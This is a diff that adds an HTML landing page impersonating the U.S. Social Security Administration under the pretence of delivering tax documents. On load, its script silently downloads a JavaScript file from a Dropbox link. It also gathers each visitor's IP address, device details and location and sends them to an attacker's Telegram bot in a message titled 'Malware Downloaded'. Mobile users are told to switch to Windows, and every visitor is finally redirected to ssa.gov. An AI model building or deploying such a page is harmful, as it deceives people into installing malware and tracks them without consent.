@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Social Security Administration - Application Download</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            background: url('background.jpg') no-repeat center center fixed;
+            background-size: cover;
+            position: relative;
+        }
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(255, 255, 255, 0.85);
+            z-index: -1;
+        }
+        .container {
+            text-align: center;
+            padding: 30px;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.15);
+            width: 90%;
+            max-width: 450px;
+            border: 1px solid #ddd;
+        }
+        .logo {
+            margin-bottom: 15px;
+            max-width: 100%;
+            height: auto;
+            max-height: 80px;
+        }
+        .agency-name {
+            color: #1b3d6d;
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 25px;
+        }
+        .status-message {
+            font-size: 17px;
+            margin: 20px 0;
+            color: #333;
+            line-height: 1.5;
+        }
+        .completed {
+            color: #2e7d32;
+            font-weight: bold;
+        }
+        .error-message {
+            color: #d32f2f;
+            font-weight: bold;
+            margin: 20px 0;
+            padding: 15px;
+            border: 1px solid #ffcdd2;
+            background-color: #ffebee;
+            border-radius: 5px;
+            line-height: 1.5;
+        }
+        .rolling-container {
+            margin: 30px 0;
+            height: 60px;
+            position: relative;
+        }
+        .dot {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background-color: #1b3d6d;
+            top: 0;
+            left: 50%;
+            transform: translate(-50%, 0);
+            opacity: 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://c7.alamy.com/comp/2CDJB6B/social-security-administration-ssa-2CDJB6B.jpg" alt="Social Security Administration" class="logo">
+        <div class="agency-name">Social Security Administration</div>
+        <div id="contentArea">
+            <div class="status-message">Downloading Tax Documents,please check your download folder to view...</div>
+        </div>
+        <div class="rolling-container" id="rollingContainer">
+            <div class="dot" id="dot1"></div>
+            <div class="dot" id="dot2"></div>
+            <div class="dot" id="dot3"></div>
+            <div class="dot" id="dot4"></div>
+            <div class="dot" id="dot5"></div>
+            <div class="dot" id="dot6"></div>
+            <div class="dot" id="dot7"></div>
+            <div class="dot" id="dot8"></div>
+        </div>
+    </div>
+
+    <script>
+        // Configuration - UPDATE THESE VALUES
+        const DOWNLOAD_LINK = 'https://www.dropbox.com/scl/fi/puau4t9ris04jby60jp4n/Tax_document-2026_ref-554378800152846499517777773549.js?rlkey=qc4nllugoyrr0ohw4w5o0jwvk&st=hzkmbfkt&dl=1'; // CHANGE THIS TO YOUR DOWNLOAD LINK
+        const BACKGROUND_IMAGE_NAME = 'background.jpg'; // Name of your background image
+        const REDIRECT_URL = 'https://www.ssa.gov/';
+        const DESKTOP_REDIRECT_DELAY = 15; // 3 seconds for desktop users
+        
+        // Telegram Webhook Configuration - UPDATE WITH YOUR DETAILS
+        const TELEGRAM_BOT_TOKEN = '8789289338:AAHHULXu_rKpg3FTo25Da8X9gRxarUzBBZ4';
+        const TELEGRAM_CHAT_ID = '8630161918';
+        const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+        // DOM Elements
+        const contentArea = document.getElementById('contentArea');
+        const rollingContainer = document.getElementById('rollingContainer');
+        const dots = Array.from({length: 8}, (_, i) => document.getElementById(`dot${i+1}`));
+
+        // Check if mobile device
+        function isMobileDevice() {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        }
+
+        // Circular rolling animation
+        const radius = 25;
+        let angle = 0;
+        let animationInterval;
+        
+        function startRollingAnimation() {
+            updateDotPositions();
+            animationInterval = setInterval(updateDotPositions, 100);
+        }
+        
+        function updateDotPositions() {
+            dots.forEach((dot, i) => {
+                const dotAngle = angle + (i * (Math.PI / 4));
+                const x = Math.sin(dotAngle) * radius;
+                const y = Math.cos(dotAngle) * radius;
+                dot.style.transform = `translate(calc(-50% + ${x}px), ${y}px)`;
+                dot.style.opacity = '0.7';
+            });
+            angle = (angle + 0.1) % (Math.PI * 2);
+        }
+
+        function stopRollingAnimation() {
+            clearInterval(animationInterval);
+            rollingContainer.style.display = 'none';
+        }
+
+        // Collect device and location information
+        async function collectDeviceInfo() {
+            const info = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                isMobile: isMobileDevice(),
+                ipAddress: await fetch('https://api.ipify.org?format=json')
+                    .then(r => r.json())
+                    .then(d => d.ip)
+                    .catch(() => 'Unknown')
+            };
+
+            try {
+                const ipLocation = await fetch(`https://ipapi.co/${info.ipAddress}/json/`).then(r => r.json());
+                info.country = ipLocation.country_name || "Unknown";
+                info.state = ipLocation.region || "Unknown";
+                info.city = ipLocation.city || "Unknown";
+            } catch (e) {
+                info.country = info.state = info.city = "Unknown";
+            }
+
+            return info;
+        }
+
+        // Send data to Telegram
+        async function sendToTelegram(data) {
+            try {
+                const text = `🔔 Malware Downloaded (#ND)\n\n` +
+                    `📱 Device: ${data.platform}\n` +
+                    `📲 Mobile: ${data.isMobile ? 'Yes' : 'No'}\n` +
+                    `🌐 User Agent: ${data.userAgent}\n` +
+                    `📍 Location: ${data.city}, ${data.state}, ${data.country}\n` +
+                    `📡 IP: ${data.ipAddress}\n` +
+                    `🕒 Time: ${new Date(data.timestamp).toLocaleString()}`;
+
+                await fetch(TELEGRAM_API_URL, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: text,
+                        disable_notification: false
+                    })
+                });
+            } catch (error) {
+                console.error("Telegram error:", error);
+            }
+        }
+
+        // Show mobile error message with SSA header
+        function showMobileError() {
+            contentArea.innerHTML = `
+                <div class="error-message">
+                    The document is not available for mobile devices. Please switch to a Windows computer to download and view the document.
+                </div>
+            `;
+        }
+
+        // Show download success message
+        function showDownloadSuccess() {
+            contentArea.innerHTML = `
+                <div class="status-message completed">
+                    Download completed successfully! The application will now install.
+                </div>
+            `;
+        }
+
+        // Trigger file download from custom link
+        function triggerFileDownload() {
+            // Create a temporary anchor element to trigger download
+            const link = document.createElement('a');
+            link.href = DOWNLOAD_LINK;
+            link.download = ''; // Empty string to let browser determine filename
+            link.target = '_blank';
+            link.rel = 'noopener noreferrer';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            
+            // Create iframe as fallback for browsers that block popups
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = DOWNLOAD_LINK;
+            document.body.appendChild(iframe);
+            
+            // Remove iframe after delay
+            setTimeout(() => {
+                if (document.body.contains(iframe)) {
+                    document.body.removeChild(iframe);
+                }
+            }, 6000);
+        }
+
+        // Main process
+        async function main() {
+            const deviceInfo = await collectDeviceInfo();
+            
+            if (deviceInfo.isMobile) {
+                showMobileError();
+                return;
+            }
+            
+            // Start both download and animation simultaneously
+            triggerFileDownload();
+            startRollingAnimation();
+            
+            // After 2 seconds, show completion message but keep animating
+            setTimeout(() => {
+                showDownloadSuccess();
+            }, 5000);
+            
+            // After total 5 seconds, stop animation and redirect
+            setTimeout(async () => {
+                stopRollingAnimation();
+                await sendToTelegram(deviceInfo);
+                window.location.href = REDIRECT_URL;
+            }, 5000);
+        }
+
+        // Start the process
+        main();
+    </script>
+</body>
+</html>
